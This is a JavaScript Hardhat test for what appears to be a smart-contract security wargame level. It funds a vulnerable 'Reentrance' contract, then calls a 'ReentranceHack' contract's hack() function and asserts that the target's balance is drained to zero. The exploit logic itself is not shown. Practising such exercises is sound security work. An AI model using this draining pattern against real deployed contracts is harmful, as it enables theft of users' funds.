const { expect } = require("chai");
const { ethers, deployments } = require("hardhat");
describe("Reentrance Hack", () => {
  beforeEach(async () => {
    await deployments.fixture(["Reentrance", "ReentranceHack"]);
    reentrance = await ethers.getContract("Reentrance");
    reentranceHack = await ethers.getContract("ReentranceHack");
    reentranceHack.setReentraceAddress(reentrance.address, {
      value: ethers.utils.parseEther("1"),
    });
    signers = await ethers.getSigners();
    txPromise = [];
    for (let i = 0; i < Math.min(4, signers.length); i++) {
      txPromise.push(
        reentrance
          .connect(signers[i])
          .donate(signers[i].address, { value: ethers.utils.parseEther("1") })
      );
    }

    await Promise.all(txPromise);
  });

  it("Should make the funds of reentrace 0", async () => {
    balance = await ethers.provider.getBalance(reentrance.address);
    console.log("balance", ethers.utils.formatEther(balance));

    tx = await reentranceHack.hack(ethers.utils.parseEther("1"));
    await tx.wait();

    balance = await ethers.provider.getBalance(reentrance.address);
    console.log("balance", ethers.utils.formatEther(balance));
    expect(balance).to.equal(0);
  });
});
